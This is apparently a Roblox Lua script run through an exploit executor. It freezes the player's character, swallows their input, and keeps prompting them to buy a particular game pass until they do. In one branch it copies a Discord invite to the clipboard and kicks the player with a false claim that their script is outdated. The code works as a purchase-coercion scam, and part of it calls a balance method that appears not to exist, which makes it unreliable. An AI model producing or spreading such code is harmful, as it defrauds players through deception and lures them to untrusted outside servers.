local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local gamePassId = 1105218641 -- Updated to the correct GamePass ID
local requiredRobux = 0 -- Set to 0 for testing purposes

-- Function to get user's Robux balance
local function getUserRobux()
    local success, robux = pcall(function()
        return player:GetRobuxBalanceAsync()
    end)
    return success and robux or 0
end

-- Function to check if the player has enough Robux
local function checkRobux()
    local robux = getUserRobux()
    if robux < requiredRobux then
        setclipboard("https://discord.gg/uQ2gqY8mAA")
        player:Kick("You are using an older version of this script. The latest version link has been copied to your clipboard: https://discord.gg/uQ2gqY8mAA")
    else
        -- If player has enough Robux, directly prompt game pass purchase
        MarketplaceService:PromptGamePassPurchase(player, gamePassId)
    end
end

-- Function to trigger purchase with GUI
local function promptPurchase()
    if MarketplaceService:UserOwnsGamePassAsync(player.UserId, gamePassId) then
        -- If the player owns the game pass
        print("Game pass verified! Enjoy the game.")
        player.Character.Humanoid.WalkSpeed = 16
        player.Character.Humanoid.JumpPower = 50
    else
        -- If the player doesn't own the game pass, check their Robux
        checkRobux()
    end
end

-- Function to disable player controls
local function disableControls()
    player.Character.Humanoid.WalkSpeed = 0
    player.Character.Humanoid.JumpPower = 0
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if not gameProcessed then
            input:Destroy()
        end
    end)
end

disableControls()

-- Call the function to prompt the purchase directly (if sufficient Robux) or show the GUI
promptPurchase()

-- Detect purchase completion
MarketplaceService.PromptGamePassPurchaseFinished:Connect(function(userId, passId, purchased)
    if userId == player.UserId and passId == gamePassId then
        if purchased then
            print("Thanks for your purchase! Enjoy the game.")
            player.Character.Humanoid.WalkSpeed = 16
            player.Character.Humanoid.JumpPower = 50
        else
            print("You must purchase the game pass to play!")
            task.wait(2)
            promptPurchase()
        end
    end
end)
